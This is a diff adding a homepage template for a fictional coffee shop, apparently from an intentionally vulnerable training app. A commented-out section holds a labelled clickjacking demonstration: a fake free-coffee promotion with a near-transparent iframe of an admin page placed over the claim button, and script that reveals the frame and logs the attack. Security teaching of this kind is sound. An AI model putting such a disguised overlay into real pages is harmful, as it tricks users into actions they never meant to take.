@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>
+        <%= title || 'BrewMaster Coffee Shop' %>
+    </title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        .navbar-brand {
+            font-weight: bold;
+            color: #8B4513 !important;
+        }
+
+        .btn-coffee {
+            background-color: #8B4513;
+            border-color: #8B4513;
+            color: white;
+        }
+
+        .btn-coffee:hover {
+            background-color: #A0522D;
+            border-color: #A0522D;
+            color: white;
+        }
+
+        .text-coffee {
+            color: #8B4513 !important;
+        }
+
+        .bg-coffee {
+            background-color: #8B4513 !important;
+        }
+
+        footer {
+            background-color: #8B4513;
+            color: white;
+        }
+    </style>
+</head>
+
+<body>
+    <%- include('partials/navbar') %>
+
+        <main class="container my-4">
+            <div class="hero-section bg-coffee text-white text-center py-5 mb-5"
+                style="background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.unsplash.com/photo-1447933601403-0c6688de566e?ixlib=rb-4.0.3') center/cover;">
+                <div class="container">
+                    <h1 class="display-4 fw-bold">Welcome to BrewMaster Coffee</h1>
+                    <p class="lead">Exceptional coffee experiences, from our shop to your home</p>
+                    <a href="/coffee" class="btn btn-coffee btn-lg mt-3">
+                        <i class="fas fa-coffee"></i> Browse Our Menu
+                    </a>
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-md-6 mb-4">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h3 class="card-title">
+                                <i class="fas fa-store text-coffee"></i> Fresh Brewed Coffee
+                            </h3>
+                            <p class="card-text">
+                                Visit our shop for freshly brewed cappuccinos, lattes, americanos, and more.
+                                Each cup is crafted with care by our experienced baristas.
+                            </p>
+                            <ul class="list-unstyled">
+                                <li><i class="fas fa-check text-success"></i> Premium espresso drinks</li>
+                                <li><i class="fas fa-check text-success"></i> Expert baristas</li>
+                                <li><i class="fas fa-check text-success"></i> Cozy atmosphere</li>
+                            </ul>
+                            <a href="/coffee?category=brewed" class="btn btn-coffee">View Brewed Options</a>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-md-6 mb-4">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h3 class="card-title">
+                                <i class="fas fa-shipping-fast text-coffee"></i> Coffee Blends Online
+                            </h3>
+                            <p class="card-text">
+                                Take our premium coffee blends home with you. Order online and enjoy
+                                BrewMaster quality coffee whenever you want.
+                            </p>
+                            <ul class="list-unstyled">
+                                <li><i class="fas fa-check text-success"></i> Signature blends</li>
+                                <li><i class="fas fa-check text-success"></i> Single-origin options</li>
+                                <li><i class="fas fa-check text-success"></i> Fresh roasted</li>
+                            </ul>
+                            <a href="/coffee?category=blend" class="btn btn-coffee">Shop Coffee Blends</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Special Promotion Section with Hidden Clickjacking Attack -->
+            <!-- <div class="row mt-5">
+                <div class="col-12">
+                    <div class="card border-warning">
+                        <div class="card-header bg-warning text-dark">
+                            <h3 class="mb-0"><i class="fas fa-gift"></i> 🎉 Limited Time Offer! 🎉</h3>
+                        </div>
+                        <div class="card-body text-center position-relative">
+                            <h4>Free Premium Coffee Blend!</h4>
+                            <p class="lead">Get a FREE bag of our signature coffee blend - worth $24.99!</p>
+                            <p>Click the button below to claim your exclusive offer. Limited to first 100 customers!</p>
+
+                           
+                            <button class="btn btn-success btn-lg mb-3 position-relative" id="promo-button"
+                                onclick="showPromotionResult()">
+                                <i class="fas fa-gift"></i> Claim Your FREE Coffee Now!
+                            </button>
+
+                            
+                            <iframe id="clickjack-frame" src="/admin/secret" style="position: absolute; 
+                                       top: 100px; 
+                                       left: 50%; 
+                                       transform: translateX(-50%);
+                                       width: 350px; 
+                                       height: 300px; 
+                                       border: none; 
+                                       opacity: 0.01; 
+                                       z-index: 10; 
+                                       pointer-events: auto;" title="Hidden Admin Panel">
+                            </iframe>
+
+                            <div class="mt-3">
+                                <small class="text-muted">* Offer valid while supplies last. No purchase
+                                    necessary.</small>
+                            </div>
+
+                            
+                            <div class="mt-4 p-3 bg-light rounded" style="font-size: 12px;">
+                                <strong>🔍 Security Research Tools:</strong>
+                                <button class="btn btn-sm btn-outline-secondary ms-2" onclick="toggleFrameVisibility()">
+                                    Toggle Frame Visibility
+                                </button>
+                                <button class="btn btn-sm btn-outline-info ms-2" onclick="showAttackDetails()">
+                                    Show Attack Info
+                                </button>
+                                <div id="attack-info" class="mt-2" style="display: none;">
+                                    <small class="text-danger">
+                                        <strong>Clickjacking Attack Active:</strong> Hidden iframe (/admin/secret)
+                                        positioned over promotion button.
+                                        Clicking "Claim FREE Coffee" actually clicks the admin panel if user is logged
+                                        in as
+                                        admin.
+                                    </small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div> -->
+
+            <div class="row mt-5">
+                <div class="col-12">
+                    <h2 class="text-center mb-4">Why Choose BrewMaster?</h2>
+                </div>
+                <div class="col-md-4 text-center mb-4">
+                    <div class="p-4">
+                        <i class="fas fa-leaf fa-3x text-coffee mb-3"></i>
+                        <h4>Ethically Sourced</h4>
+                        <p>We work directly with coffee farmers to ensure fair trade and sustainable practices.</p>
+                    </div>
+                </div>
+                <div class="col-md-4 text-center mb-4">
+                    <div class="p-4">
+                        <i class="fas fa-fire fa-3x text-coffee mb-3"></i>
+                        <h4>Expertly Roasted</h4>
+                        <p>Our master roasters bring out the unique characteristics of each coffee bean.</p>
+                    </div>
+                </div>
+                <div class="col-md-4 text-center mb-4">
+                    <div class="p-4">
+                        <i class="fas fa-heart fa-3x text-coffee mb-3"></i>
+                        <h4>Passionate Service</h4>
+                        <p>Every cup is crafted with love and attention to detail by our dedicated team.</p>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="mt-5 py-4 text-center">
+            <div class="container">
+                <p>&copy; 2024 BrewMaster Coffee Shop. All rights reserved.</p>
+                <p>
+                    <a href="/files/menu.pdf" class="text-white-50">Download PDF Menu</a> |
+                    <a href="/admin/secret" class="text-white-50">Admin</a>
+                </p>
+            </div>
+        </footer>
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
+        <!-- <script>
+            // Legitimate promotional button handler (should rarely execute due to iframe overlay)
+            function showPromotionResult() {
+                alert('🎉 Promotion Activated!\n\nYour free coffee voucher has been sent to your email!\n\n(Note: This message indicates the clickjacking attack failed - you clicked the actual button instead of the hidden iframe)');
+            }
+
+            // Security research functions for educational purposes
+            let frameVisible = false;
+
+            function toggleFrameVisibility() {
+                const frame = document.getElementById('clickjack-frame');
+                frameVisible = !frameVisible;
+
+                if (frameVisible) {
+                    frame.style.opacity = '0.7';
+                    frame.style.border = '3px dashed red';
+                    frame.style.backgroundColor = 'rgba(255, 0, 0, 0.1)';
+                } else {
+                    frame.style.opacity = '0.01';
+                    frame.style.border = 'none';
+                    frame.style.backgroundColor = 'transparent';
+                }
+            }
+
+            function showAttackDetails() {
+                const info = document.getElementById('attack-info');
+                info.style.display = info.style.display === 'none' ? 'block' : 'none';
+            }
+
+            // Monitor iframe loading for educational feedback
+            document.addEventListener('DOMContentLoaded', function () {
+                const iframe = document.getElementById('clickjack-frame');
+
+                iframe.addEventListener('load', function () {
+                    console.log('🚨 Clickjacking Attack: Admin panel loaded in hidden iframe');
+                    console.log('🎯 Target: /admin/secret');
+                    console.log('⚠️  Clicking the promotion button will actually click the admin panel');
+
+                    // Check if we can detect admin session (limited due to same-origin policy)
+                    try {
+                        console.log('🔍 Iframe source:', this.src);
+                    } catch (e) {
+                        console.log('🔒 Cross-origin restrictions prevent iframe access');
+                    }
+                });
+
+                iframe.addEventListener('error', function () {
+                    console.log('✅ Good: Frame loading blocked by security headers');
+                    console.log('🛡️ The target site may have proper clickjacking protection');
+                });
+
+                // Log the attack setup
+                console.log('🏠 Homepage loaded with embedded clickjacking attack');
+                console.log('🎭 Attack appears as legitimate promotion to users');
+            });
+
+            // Detect successful clickjacking (if possible)
+            window.addEventListener('message', function (event) {
+                if (event.origin === window.location.origin) {
+                    console.log('📨 Message received from iframe:', event.data);
+                }
+            });
+        </script> -->
+</body>
+
+</html>
